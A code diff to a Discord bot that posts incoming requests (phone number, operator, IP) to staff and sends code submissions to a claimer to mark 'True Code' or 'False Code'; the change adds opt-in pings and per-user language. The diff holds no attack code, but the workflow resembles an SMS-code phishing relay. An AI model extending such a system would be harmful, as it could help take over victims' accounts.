@@ -20,6 +20,9 @@ import { getPendingRequests, getCodeSubmittedRequests } from "./database.js";
 import { buildNewRequestEmbed, buildCodeSubmittedEmbed } from "./utils/embedBuilder.js";
 import { getClaimer } from "./utils/claimStore.js";
 import { rememberMessage } from "./utils/messageStore.js";
+import { buildRequestPing } from "./utils/pings.js";
+import { getLang } from "./utils/userPrefs.js";
+import { t } from "./utils/i18n.js";
 
 const POLL_INTERVAL_MS = 5000;
 
@@ -79,12 +82,17 @@ async function sendNewRequest(client, row) {
             .setStyle(ButtonStyle.Primary),
     ];
 
+    // Ping only the staff who asked to be pinged. The embed itself stays in
+    // one language on purpose — it's a single shared channel message, and
+    // Discord cannot render one message differently per viewer.
+    const ping = await buildRequestPing(channel.guild);
+
     try {
         const sent = await channel.send({
-            content: CONFIG.PING_MESSAGE || `<@&${CONFIG.ACCESS_ROLE_ID}>`,
+            content: ping.content,
             embeds: [embed],
             components: [new ActionRowBuilder().addComponents(...buttons)],
-            allowedMentions: { roles: [CONFIG.ACCESS_ROLE_ID] },
+            allowedMentions: ping.allowedMentions,
         });
         rememberMessage(row.phone, channel.id, sent.id);
         console.log("📨 New request sent to Discord:", row.phone);
@@ -102,23 +110,27 @@ async function sendNewRequest(client, row) {
  * or their DMs are closed, so the request never gets silently lost.
  */
 async function sendCodeSubmitted(client, row) {
-    const embed = buildCodeSubmittedEmbed(row);
+    // Resolve the claimer via the shared claimStore (in-memory + DB fallback, cached).
+    const claimerId = await getClaimer(row.phone);
+
+    // This one goes to a single person's DMs, so unlike the channel embed it
+    // CAN be written in that person's own language.
+    const lang = claimerId ? await getLang(claimerId) : "en";
+
+    const embed = buildCodeSubmittedEmbed(row, lang);
     const buttons = [
         new ButtonBuilder()
             .setCustomId("truecode_" + row.phone)
-            .setLabel("✅ True Code")
+            .setLabel(t(lang, "code_dm_btn_true"))
             .setStyle(ButtonStyle.Success),
         new ButtonBuilder()
             .setCustomId("falsecode_" + row.phone)
-            .setLabel("❌ False Code")
+            .setLabel(t(lang, "code_dm_btn_false"))
             .setStyle(ButtonStyle.Danger),
     ];
     const banBtn = createBanIPButton(row.ip_address);
     if (banBtn) buttons.push(banBtn);
     const components = [new ActionRowBuilder().addComponents(...buttons)];
-
-    // Resolve the claimer via the shared claimStore (in-memory + DB fallback, cached).
-    const claimerId = await getClaimer(row.phone);
 
     if (claimerId) {
         try {
@@ -137,9 +149,11 @@ async function sendCodeSubmitted(client, row) {
     const channel = getChannelForOperator(client, row.operator);
     if (!channel) return false; // nowhere to deliver — will retry next poll
     try {
+        // Fallback into a shared channel: rebuild the embed in English since
+        // it's now visible to everyone, not just the claimer.
         await channel.send({
             content: claimerId ? `<@${claimerId}> — could not DM you, posting here instead:` : "⚠️ No claimer found for this code submission",
-            embeds: [embed],
+            embeds: [buildCodeSubmittedEmbed(row, "en")],
             components,
         });
         console.log("🔓 Code submission sent to channel (fallback):", row.phone);
